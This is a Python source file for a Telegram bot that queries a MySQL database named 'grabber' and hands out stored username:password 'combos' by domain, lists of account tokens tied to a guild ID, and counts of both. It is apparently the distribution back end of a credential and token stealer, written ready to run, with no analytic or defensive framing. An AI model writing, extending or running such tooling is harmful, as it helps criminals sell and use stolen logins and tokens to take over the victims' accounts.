import telebot
import mysql.connector
import datetime
import tempfile

# Replace the values below with your own bot token and database details
bot_token = ''
db_host = '127.0.0.1'
db_user = 'grabber'
db_pass = 'grabber'
db_name = 'grabber'


db = mysql.connector.connect(
    host=db_host,
    user=db_user,
    password=db_pass,
    database=db_name
)


cursor = db.cursor()


bot = telebot.TeleBot(bot_token)






@bot.message_handler(commands=['combos'])
def handle_combos(message):
    try:
        print(f"User {message.from_user.id} used the '/combos' command at {datetime.datetime.now()}")

        keyword = message.text.replace("/combos", "").strip()

        if not keyword:
            bot.send_message(message.chat.id, "Please enter a keyword.")
            return

        cursor.execute("SELECT username, password FROM combos WHERE domain LIKE %s AND guildId = %s", ('%' + keyword + '%', '1046545411093053530'))

        print(f"SQL Query: {cursor.statement}")

        results = cursor.fetchall()

        if not results:
            bot.send_message(message.chat.id, "No results found.")
            return

        with tempfile.NamedTemporaryFile(prefix=f"combos_{keyword}_", suffix=".txt", mode='w+', delete=False) as file:
            # Write the formatted results to the file
            for row in results:
                file.write(f"{row[0]}:{row[1]}\n")

            # Reset the file pointer to the beginning
            file.seek(0)

            # Send the file to the user
            bot.send_document(message.chat.id, file, caption="Results for keyword: " + keyword, reply_to_message_id=message.message_id)

    except Exception as e:
        # If there was an error, send an error message to the user
        bot.send_message(message.chat.id, "An error occurred: " + str(e))
 
 
 
 
 
        
# Define the "/tokens" command handler
@bot.message_handler(commands=['tokens'])
def handle_tokens(message):
    try:
        # Log the user's usage of the "/tokens" command
        print(f"User {message.from_user.id} used the '/tokens' command at {datetime.datetime.now()}")

        # Get the number of tokens the user wants, default to 10
        num_tokens = message.text.replace("/tokens", "").strip()
        if not num_tokens:
            num_tokens = 10
        else:
            num_tokens = int(num_tokens)

        # Execute the SQL query to fetch the tokens
        cursor.execute("SELECT token FROM tokens WHERE guildId = %s ORDER BY addedAt DESC LIMIT %s", ('1046545411093053530', num_tokens))

        # Log the SQL query
        print(f"SQL Query: {cursor.statement}")

        # Fetch all the results
        results = cursor.fetchall()

        # Check if the query returned any results
        if not results:
            bot.send_message(message.chat.id, "No results found.")
            return

        # Create a temporary file to hold the results
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix=f'_tokens_{num_tokens}.txt') as file:
            # Write the results to the file
            for row in results:
                file.write(row[0] + "\n")

            # Reset the file pointer to the beginning
            file.seek(0)

            # Send the file to the user
            bot.send_document(message.chat.id, file, caption=f"{num_tokens} Tokens", reply_to_message_id=message.message_id)

    except Exception as e:
        # If there was an error, send an error message to the user
        bot.send_message(message.chat.id, "An error occurred: " + str(e))




# Define the "/count" command handler
@bot.message_handler(commands=['count'])
def handle_count(message):
    try:
        # Log the user's usage of the "/count" command
        print(f"User {message.from_user.id} used the '/count' command at {datetime.datetime.now()}")

        # Execute the SQL query to count the entries in the "combos" table
        cursor.execute("SELECT COUNT(*) FROM combos")

        # Fetch the results
        combos_count = cursor.fetchone()[0]

        # Execute the SQL query to count the entries in the "tokens" table
        cursor.execute("SELECT COUNT(*) FROM tokens")

        # Fetch the results
        tokens_count = cursor.fetchone()[0]

        # Send the counts to the user
        bot.send_message(message.chat.id, f"Number of entries in combos table: {combos_count}\nNumber of entries in tokens table: {tokens_count}")

    except Exception as e:
        # If there was an error, send an error message to the user
        bot.send_message(message.chat.id, "An error occurred: " + str(e))


        
@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = "Welcome to the Help Page!\n\n" \
                "/combos - Get Combos From The Database\n" \
                "/tokens - Get Tokens From The Database\n" \
                "/count - See How Many Tokens And Combos Are In The Database\n" \
                "/help - Show This Message\n"
    bot.reply_to(message, help_text)






# Start the bot
bot.polling()
